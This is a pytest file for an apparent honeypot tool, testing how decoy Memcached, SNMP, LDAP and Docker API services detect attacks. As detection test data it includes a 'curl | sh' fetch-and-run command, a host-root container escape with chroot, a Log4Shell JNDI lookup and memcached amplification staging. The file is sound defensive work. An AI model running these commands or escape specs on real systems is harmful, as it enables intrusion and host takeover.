"""Memcached, SNMP, LDAP and Docker API engines.

These four close the catalogue's biggest gaps against what is actually scanned
on the public internet: an amplification reflector, a cleartext-credential UDP
service, the Log4Shell second-stage listener, and an unauthenticated container
runtime.

The tests concentrate on the classification boundaries rather than on the
protocol plumbing, because that is where these engines earn their keep. A
Docker honeypot that records "someone POSTed to /containers/create" is nearly
useless; one that says "this create mounts host / at /mnt, is privileged, and
runs chroot" is an incident. The same split applies to the others: a `set`
followed by a `get` is amplification staging, not caching; a search for
`Exploit` asking for `javaClassName` is Log4Shell, not directory browsing.
"""

from __future__ import annotations

import asyncio
import contextlib
import json
import os
import socket

import pytest

os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"

pytestmark = pytest.mark.asyncio


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    await init_db()
    buffer = event_buffer.get_buffer()
    await buffer.start()
    yield
    await buffer.stop()
    await close_db()
    event_buffer.reset_for_tests()


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


async def _register(name: str, hp_type) -> int:
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotStatus

    port = _free_port()
    async with get_session() as session:
        session.add(
            Honeypot(
                name=name,
                type=hp_type,
                port=port,
                status=HoneypotStatus.RUNNING,
                container_id=None,
                config={},
            )
        )
    return port


async def _alert_types() -> list[str]:
    from sqlalchemy import select

    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    for _ in range(30):
        await asyncio.sleep(0.1)
        async with get_session() as session:
            rows = (await session.execute(select(Alert))).scalars().all()
        if rows:
            return [r.event_type for r in rows]
    return []


async def _alerts() -> list:
    from sqlalchemy import select

    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert

    async with get_session() as session:
        return list((await session.execute(select(Alert))).scalars().all())


async def _talk(port: int, payload: bytes, read: int = 65536, wait: float = 0.3) -> bytes:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        writer.write(payload)
        await writer.drain()
        await asyncio.sleep(wait)
        with contextlib.suppress(Exception):
            return await asyncio.wait_for(reader.read(read), timeout=2.0)
        return b""
    finally:
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


# ── Memcached ───────────────────────────────────────────────────────────────


async def test_memcached_version_and_stats_are_self_consistent():
    """nmap reads the version from both; disagreement is itself a fingerprint."""
    from honeypot_mcp.engines.memcached import _MEMCACHED_VERSION, _stats_lines

    stats = _stats_lines(864_000, 1)
    assert f"STAT version {_MEMCACHED_VERSION}" in stats
    # An all-zero counter set looks like a server that has never served anyone.
    assert any(line.startswith("STAT cmd_get ") and not line.endswith(" 0") for line in stats)


async def test_memcached_stage_then_retrieve_is_flagged_as_amplification():
    """`set` a large value then `get` it back is reflector staging.

    Either half alone is ordinary cache traffic; the sequence is the attack.
    """
    from honeypot_mcp.engines.memcached import MemcachedEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("mc-amp", HoneypotType.MEMCACHED)
    engine = MemcachedEngine()
    cid = await engine.start("mc-amp", port, {})
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(b"set amp 0 0 8192\r\n" + b"A" * 8192 + b"\r\n")
        await writer.drain()
        await asyncio.sleep(0.3)
        await reader.read(64)
        writer.write(b"get amp\r\n")
        await writer.drain()
        await asyncio.sleep(0.4)
        reflected = await reader.read(65536)
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()
        await asyncio.sleep(0.5)
    finally:
        await engine.stop(cid)

    assert len(reflected) > 8000, "the staged value was not reflected"
    types = [a.event_type for a in await _alerts()]
    assert "memcached_large_set" in types
    assert "memcached_amplification_attempt" in types

    critical = [a for a in await _alerts() if a.event_type == "memcached_amplification_attempt"]
    assert critical[0].severity.value == "critical"
    assert critical[0].payload["amplification_factor"] > 100


async def test_memcached_small_set_is_not_an_amplification_alert():
    """Ordinary cache traffic must not cry wolf."""
    from honeypot_mcp.engines.memcached import MemcachedEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("mc-small", HoneypotType.MEMCACHED)
    engine = MemcachedEngine()
    cid = await engine.start("mc-small", port, {})
    try:
        await _talk(port, b"set session 0 0 5\r\nhello\r\nget session\r\n")
        await asyncio.sleep(0.5)
    finally:
        await engine.stop(cid)

    types = [a.event_type for a in await _alerts()]
    assert "memcached_set" in types
    assert "memcached_large_set" not in types
    assert "memcached_amplification_attempt" not in types


async def test_memcached_set_body_with_embedded_crlf_does_not_desync_the_parser():
    """The data block of a `set` is exactly <bytes> bytes of arbitrary
    content, which may legitimately contain embedded CRLFs — real memcached
    values are not text lines. Splitting on the next b"\\r\\n" instead of
    consuming exactly the declared byte count truncated the body early at
    the embedded CRLF and fed the remainder back into the parser as a new
    "command", corrupting both the stored size and every command after it
    in the same connection."""
    from honeypot_mcp.engines.memcached import MemcachedEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("mc-embedded-crlf", HoneypotType.MEMCACHED)
    engine = MemcachedEngine()
    cid = await engine.start("mc-embedded-crlf", port, {})
    try:
        # Declares 10 bytes; the 10-byte body itself contains a CRLF at
        # position 2. A desynced parser stops at that embedded CRLF (2-byte
        # "body"), then misreads the remaining "cdefgh" + the real
        # terminator as a bogus next command instead of the tail of the
        # value — and STORED never arrives for the real set, nor does the
        # subsequent `version` command get a clean reply.
        body = b"ab\r\ncdefgh"
        assert len(body) == 10
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        try:
            writer.write(b"set k 0 0 10\r\n" + body + b"\r\n" + b"version\r\n")
            await writer.drain()
            await asyncio.sleep(0.4)
            resp = await asyncio.wait_for(reader.read(65536), timeout=2.0)
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()
    finally:
        await engine.stop(cid)

    assert resp.count(b"STORED\r\n") == 1, resp
    assert b"VERSION" in resp, resp

    alerts = await _alerts()
    set_events = [a for a in alerts if a.event_type in ("memcached_set", "memcached_large_set")]
    assert len(set_events) == 1
    assert set_events[0].payload.get("value_bytes") == 10


async def test_memcached_flush_all_is_recorded_as_destructive():
    from honeypot_mcp.engines.memcached import MemcachedEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("mc-flush", HoneypotType.MEMCACHED)
    engine = MemcachedEngine()
    cid = await engine.start("mc-flush", port, {})
    try:
        response = await _talk(port, b"flush_all\r\n")
        await asyncio.sleep(0.4)
    finally:
        await engine.stop(cid)

    assert response.strip() == b"OK"
    flush = [a for a in await _alerts() if a.event_type == "memcached_flush_all"]
    assert flush and flush[0].severity.value == "high"


# ── SNMP ────────────────────────────────────────────────────────────────────


async def test_snmp_request_round_trips_through_the_ber_codec():
    from honeypot_mcp.engines.snmp import build_get_request, parse_snmp

    packet = build_get_request("1.3.6.1.2.1.1.1.0", "public", request_id=42)
    parsed = parse_snmp(packet)
    assert parsed is not None
    assert parsed["community"] == "public"
    assert parsed["version_name"] == "v2c"
    assert parsed["pdu_name"] == "GetRequest"
    assert parsed["request_id"] == 42
    assert parsed["oids"] == ["1.3.6.1.2.1.1.1.0"]


async def test_snmp_response_carries_a_real_sysdescr():
    """An empty or zeroed sysDescr is what an empty socket returns."""
    from honeypot_mcp.engines.snmp import _SYS_DESCR, build_get_request, build_response, parse_snmp

    request = parse_snmp(build_get_request("1.3.6.1.2.1.1.1.0"))
    response = build_response(request)
    assert _SYS_DESCR.encode() in response
    assert parse_snmp(response) is not None


@pytest.mark.parametrize(
    ("community", "pdu", "expected_type", "expected_severity"),
    [
        ("public", 0xA0, "snmp_default_community", "high"),
        ("private", 0xA0, "snmp_default_community", "high"),
        ("s3cr3t", 0xA0, "snmp_community_attempt", "medium"),
        ("public", 0xA3, "snmp_set_request", "critical"),
        ("public", 0xA5, "snmp_bulk_request", "high"),
    ],
)
async def test_snmp_classification(community, pdu, expected_type, expected_severity):
    from honeypot_mcp.engines.snmp import classify

    event_type, severity = classify({"community": community, "pdu_type": pdu})
    assert event_type == expected_type
    assert severity.value == expected_severity


async def test_snmp_answers_default_communities_and_ignores_others():
    """A wrong community gets silence, exactly as a real agent does.

    Answering everything would identify the sensor in one packet.
    """
    from honeypot_mcp.engines.snmp import SNMPEngine, build_get_request
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("snmp-1", HoneypotType.SNMP)
    engine = SNMPEngine()
    cid = await engine.start("snmp-1", port, {})
    try:
        # The query has to be async. The engine runs on this same event loop,
        # so a blocking `socket.recv` starves it: the datagram is only handled
        # after the client has already timed out, and the engine looks broken
        # when it is the test that is stalling it.
        async def query(community: str, timeout: float) -> bytes:
            loop = asyncio.get_running_loop()
            received: asyncio.Future[bytes] = loop.create_future()

            class _Client(asyncio.DatagramProtocol):
                def datagram_received(self, data: bytes, addr: tuple[str, int]) -> None:
                    if not received.done():
                        received.set_result(data)

            # Bound, not connected. `remote_addr` connects the socket, which
            # then drops any datagram whose source address does not match
            # exactly — and the engine is bound to 0.0.0.0, so the kernel picks
            # the reply's source address. That made this pass on some
            # platforms and fail on others for reasons unrelated to SNMP.
            transport, _ = await loop.create_datagram_endpoint(_Client, local_addr=("127.0.0.1", 0))
            try:
                transport.sendto(
                    build_get_request("1.3.6.1.2.1.1.1.0", community), ("127.0.0.1", port)
                )
                with contextlib.suppress(TimeoutError):
                    return await asyncio.wait_for(received, timeout=timeout)
                return b""
            finally:
                transport.close()

        good = b""
        for _ in range(5):
            good = await query("public", timeout=2.0)
            if good:
                break
        # A wrong community must produce silence, so this one has to wait out
        # the full timeout rather than retry.
        bad = await query("wrongcommunity", timeout=2.0)

        await asyncio.sleep(0.5)
    finally:
        await engine.stop(cid)

    assert good, "a default community must be answered"
    assert not bad, "a wrong community must be met with silence"
    types = [a.event_type for a in await _alerts()]
    assert "snmp_default_community" in types
    assert "snmp_community_attempt" in types


async def test_datagram_protocols_do_not_type_check_the_transport():
    """`connection_made` must accept whatever asyncio hands it.

    On Python 3.11 `_SelectorDatagramTransport` is not a subclass of
    `asyncio.DatagramTransport` — the MRO changed in 3.12 — so an
    `assert isinstance(transport, asyncio.DatagramTransport)` raises. asyncio
    swallows that into its exception handler, the protocol never stores its
    transport, and the SNMP agent then records every request while answering
    none of them. It was a silent, version-specific mute button on a supported
    interpreter, and CI on 3.11 was the only thing that saw it.

    Passing an object that is deliberately *not* a DatagramTransport pins the
    behaviour on every version, including the ones where the isinstance check
    would happen to pass.
    """
    from honeypot_mcp.engines.snmp import _SNMPProtocol
    from honeypot_mcp.webhooks import _SyslogUDPProtocol

    class _NotATransport:
        def sendto(self, data, addr=None):  # pragma: no cover - never called
            pass

        def get_extra_info(self, name, default=None):  # pragma: no cover
            return default

    stand_in = _NotATransport()

    snmp_protocol = _SNMPProtocol("t", None)
    snmp_protocol.connection_made(stand_in)  # type: ignore[arg-type]
    assert snmp_protocol._transport is stand_in

    syslog_protocol = _SyslogUDPProtocol()
    syslog_protocol.connection_made(stand_in)  # type: ignore[arg-type]
    assert syslog_protocol.transport is stand_in


async def test_snmp_records_the_community_as_a_credential():
    """So planted community strings cross-reference like any other secret."""
    from honeypot_mcp.credential_match import _infer_service

    assert _infer_service("snmp_community_attempt") == "snmp"


# ── LDAP ────────────────────────────────────────────────────────────────────


def _bind(dn: str, password: str, message_id: int = 1) -> bytes:
    from honeypot_mcp.engines.ldap import _OCTET_STRING, _SEQUENCE, _encode_int, _tlv

    body = _encode_int(3) + _tlv(_OCTET_STRING, dn.encode()) + _tlv(0x80, password.encode())
    return _tlv(_SEQUENCE, _encode_int(message_id) + _tlv(0x60, body))


def _search(base: str, attributes: list[str], message_id: int = 2) -> bytes:
    from honeypot_mcp.engines.ldap import _OCTET_STRING, _SEQUENCE, _encode_int, _tlv

    attrs = b"".join(_tlv(_OCTET_STRING, a.encode()) for a in attributes)
    body = (
        _tlv(_OCTET_STRING, base.encode())
        + _encode_int(0, 0x0A)
        + _encode_int(0, 0x0A)
        + _encode_int(0)
        + _encode_int(0)
        + _tlv(0x01, b"\x00")
        + _tlv(0x87, b"objectClass")
        + _tlv(_SEQUENCE, attrs)
    )
    return _tlv(_SEQUENCE, _encode_int(message_id) + _tlv(0x63, body))


async def test_ldap_simple_bind_credentials_are_captured_in_the_clear():
    from honeypot_mcp.engines.ldap import LDAPEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("ldap-bind", HoneypotType.LDAP)
    engine = LDAPEngine()
    cid = await engine.start("ldap-bind", port, {})
    try:
        response = await _talk(port, _bind("cn=admin,dc=corp,dc=local", "Summer2024!"))
        await asyncio.sleep(0.4)
    finally:
        await engine.stop(cid)

    # resultCode 49 == invalidCredentials, which keeps a brute-forcer cycling.
    assert b"\x0a\x01\x31" in response

    binds = [a for a in await _alerts() if a.event_type == "ldap_bind_attempt"]
    assert binds, "no bind attempt recorded"
    payload = binds[0].payload
    assert payload["bind_dn"] == "cn=admin,dc=corp,dc=local"
    assert payload["password"] == "Summer2024!"
    assert payload["service"] == "ldap"


async def test_ldap_anonymous_bind_is_accepted_and_recorded():
    from honeypot_mcp.engines.ldap import LDAPEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("ldap-anon", HoneypotType.LDAP)
    engine = LDAPEngine()
    cid = await engine.start("ldap-anon", port, {})
    try:
        response = await _talk(port, _bind("", ""))
        await asyncio.sleep(0.4)
    finally:
        await engine.stop(cid)

    assert b"\x0a\x01\x00" in response, "anonymous bind should succeed"
    assert "ldap_anonymous_bind" in [a.event_type for a in await _alerts()]


@pytest.mark.parametrize(
    ("base_dn", "attributes", "is_jndi"),
    [
        # Log4Shell: the base object is the path segment from the payload URL.
        ("Exploit", ["javaClassName", "javaCodeBase"], True),
        ("a", ["objectClass"], True),
        ("Basic/Command/Base64/d2hvYW1p", [], True),
        # Real directory traffic always carries directory components.
        ("dc=corp,dc=local", ["cn", "mail"], False),
        ("ou=people,dc=example,dc=com", ["uid"], False),
        ("cn=Users,dc=ad,dc=local", [], False),
    ],
)
async def test_jndi_detection_separates_log4shell_from_directory_browsing(
    base_dn, attributes, is_jndi
):
    from honeypot_mcp.engines.ldap import looks_like_jndi

    assert looks_like_jndi(base_dn, attributes) is is_jndi


async def test_ldap_jndi_lookup_is_critical():
    from honeypot_mcp.engines.ldap import LDAPEngine
    from honeypot_mcp.storage.models import HoneypotType

    port = await _register("ldap-jndi", HoneypotType.LDAP)
    engine = LDAPEngine()
    cid = await engine.start("ldap-jndi", port, {})
    try:
        await _talk(port, _search("Exploit", ["javaClassName", "javaCodeBase"]))
        await asyncio.sleep(0.4)
    finally:
        await engine.stop(cid)

    jndi = [a for a in await _alerts() if a.event_type == "ldap_jndi_lookup"]
    assert jndi, "Log4Shell second stage was not flagged"
    assert jndi[0].severity.value == "critical"


# ── Docker API ──────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("spec", "expected_substring"),
    [
        ({"HostConfig": {"Binds": ["/:/mnt"]}}, "host root filesystem"),
        ({"HostConfig": {"Binds": ["/etc:/host-etc"]}}, "sensitive host path"),
        (
            {"HostConfig": {"Binds": ["/var/run/docker.sock:/var/run/docker.sock"]}},
            "Docker socket",
        ),
        ({"HostConfig": {"Privileged": True}}, "privileged"),
        ({"HostConfig": {"PidMode": "host"}}, "host PID"),
        ({"HostConfig": {"CapAdd": ["SYS_ADMIN"]}}, "dangerous capabilities"),
        ({"Image": "xmrig/xmrig:latest"}, "malicious/mining image"),
        ({"Cmd": ["sh", "-c", "curl http://x/a.sh | sh"]}, "payload-stage command"),
    ],
)
async def test_container_create_escape_indicators(spec, expected_substring):
    from honeypot_mcp.engines.docker_api import analyse_container_create

    reasons = analyse_container_create(spec)
    assert any(expected_substring in r for r in reasons), reasons


@pytest.mark.parametrize(
    "spec",
    [
        {"Image": "nginx:1.25"},
        {"Image": "postgres:15", "HostConfig": {"Binds": ["/srv/pgdata:/var/lib/postgresql/data"]}},
        {"Image": "redis:7", "Cmd": ["redis-server", "--appendonly", "yes"]},
    ],
)
async def test_ordinary_container_create_is_not_flagged_as_escape(spec):
    """False positives here would make the CRITICAL meaningless."""
    from honeypot_mcp.engines.docker_api import analyse_container_create

    assert analyse_container_create(spec) == []


@pytest.mark.parametrize(
    "spec",
    [
        {"HostConfig": "pwned"},
        {"HostConfig": 12345},
        {"HostConfig": ["a", "list"]},
        {"HostConfig": None, "Mounts": "also not a list"},
    ],
)
async def test_container_create_does_not_crash_on_type_confused_host_config(spec):
    """`spec.get("HostConfig") or {}` only replaces falsy values — a non-empty
    non-dict HostConfig (a string, a list, ...) passed straight through and
    the next .get() on it raised AttributeError, uncaught, before the
    request ever reached _record(). A real escape attempt with one
    malformed field went completely uncaptured instead of alerting."""
    from honeypot_mcp.engines.docker_api import analyse_container_create

    assert analyse_container_create(spec) == []


async def test_malformed_container_create_is_still_captured_not_500d():
    """The HTTP-level regression: a crash inside analyse_container_create
    happens before self._record() runs, so the attempt silently vanishes —
    no alert, and the attacker sees a raw 500 instead of the realistic
    201 response, itself a honeypot-identifying tell."""
    from aiohttp.test_utils import TestClient, TestServer

    from honeypot_mcp.engines.docker_api import DockerAPIEngine
    from honeypot_mcp.storage.models import HoneypotType

    await _register("dockerapi-malformed", HoneypotType.DOCKER_API)
    engine = DockerAPIEngine()
    app = engine._build_app("dockerapi-malformed", None)
    client = TestClient(TestServer(app))
    await client.start_server()
    try:
        resp = await client.post(
            "/containers/create", json={"Image": "alpine", "HostConfig": "not-a-dict"}
        )
        assert resp.status == 201, "must still respond realistically, not 500"
        await asyncio.sleep(0.4)
    finally:
        await client.close()

    types = [a.event_type for a in await _alerts()]
    assert "docker_api_container_create" in types or "docker_api_container_escape" in types


async def test_docker_api_full_attack_chain_is_captured():
    """Recon → pull → escape-create → start → exec, as the campaigns run it."""
    from aiohttp.test_utils import TestClient, TestServer

    from honeypot_mcp.engines.docker_api import DockerAPIEngine
    from honeypot_mcp.storage.models import HoneypotType

    await _register("dockerapi-1", HoneypotType.DOCKER_API)
    engine = DockerAPIEngine()
    app = engine._build_app("dockerapi-1", None)
    client = TestClient(TestServer(app))
    await client.start_server()
    try:
        version = await (await client.get("/version")).json()
        assert version["ApiVersion"] == "1.43"
        assert version["Version"] == version["Components"][0]["Version"]

        await client.get("/v1.43/info")
        await client.post("/images/create?fromImage=kinsing&tag=latest")
        created = await client.post(
            "/containers/create",
            json={
                "Image": "alpine",
                "Cmd": ["chroot", "/mnt", "sh"],
                "HostConfig": {"Binds": ["/:/mnt"], "Privileged": True},
            },
        )
        assert created.status == 201
        cid = (await created.json())["Id"]
        assert (await client.post(f"/containers/{cid}/start")).status == 204
        assert (
            await client.post(f"/containers/{cid}/exec", json={"Cmd": ["sh", "-c", "id"]})
        ).status == 201
        await asyncio.sleep(0.5)
    finally:
        await client.close()

    types = [a.event_type for a in await _alerts()]
    for expected in (
        "docker_api_recon",
        "docker_api_image_pull",
        "docker_api_container_escape",
        "docker_api_container_start",
        "docker_api_exec",
    ):
        assert expected in types, f"{expected} missing from {sorted(set(types))}"

    escape = [a for a in await _alerts() if a.event_type == "docker_api_container_escape"][0]
    assert escape.severity.value == "critical"
    assert len(escape.payload["escape_indicators"]) >= 2


async def test_docker_api_benign_create_is_high_not_critical():
    from aiohttp.test_utils import TestClient, TestServer

    from honeypot_mcp.engines.docker_api import DockerAPIEngine
    from honeypot_mcp.storage.models import HoneypotType

    await _register("dockerapi-2", HoneypotType.DOCKER_API)
    engine = DockerAPIEngine()
    client = TestClient(TestServer(engine._build_app("dockerapi-2", None)))
    await client.start_server()
    try:
        await client.post("/containers/create", json={"Image": "nginx:1.25"})
        await asyncio.sleep(0.5)
    finally:
        await client.close()

    creates = [a for a in await _alerts() if a.event_type == "docker_api_container_create"]
    assert creates and creates[0].severity.value == "high"


async def test_docker_api_serves_both_plain_and_versioned_paths():
    """Real clients prefix every call with /v1.43; scanners often do not."""
    from aiohttp.test_utils import TestClient, TestServer

    from honeypot_mcp.engines.docker_api import DockerAPIEngine

    engine = DockerAPIEngine()
    client = TestClient(TestServer(engine._build_app("dockerapi-3", None)))
    await client.start_server()
    try:
        for path in ("/version", "/v1.43/version", "/v1.41/version"):
            response = await client.get(path)
            assert response.status == 200, path
            assert (await response.json())["Version"] == "24.0.7"
        assert response.headers["Server"].startswith("Docker/")
    finally:
        await client.close()


async def test_docker_api_unknown_path_matches_the_real_daemon_404():
    from aiohttp.test_utils import TestClient, TestServer

    from honeypot_mcp.engines.docker_api import DockerAPIEngine

    engine = DockerAPIEngine()
    client = TestClient(TestServer(engine._build_app("dockerapi-4", None)))
    await client.start_server()
    try:
        response = await client.get("/nope")
        assert response.status == 404
        body = json.loads(await response.text())
        assert "page not found" in body["message"]
    finally:
        await client.close()
